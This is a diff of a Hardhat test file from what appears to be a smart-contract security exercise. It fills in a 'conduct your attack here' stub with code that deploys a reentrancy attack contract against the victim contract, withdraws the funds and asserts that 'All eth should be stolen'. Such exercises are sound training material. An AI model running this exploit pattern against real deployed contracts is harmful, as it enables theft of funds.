@@ -25,7 +25,15 @@ describe(NAME, function () {
       ({ victimContract, attackerWallet } = await loadFixture(setup));
     });
 
-    it("conduct your attack here", async function () {});
+    it("conduct your attack here", async function () {
+      const ReentranceAttackFactory = await ethers.getContractFactory("ReentranceAttack");
+      const reentrabceAttackContract = await ReentranceAttackFactory.deploy(victimContract.address);
+      await reentrabceAttackContract.donateAndWithdraw(0);
+      await reentrabceAttackContract.withdrawAll();
+
+      const victimBalance = await ethers.provider.getBalance(victimContract.address);
+      expect(victimBalance).to.equal(0,"All eth should be stolen");
+    });
 
     after(async function () {
       expect(
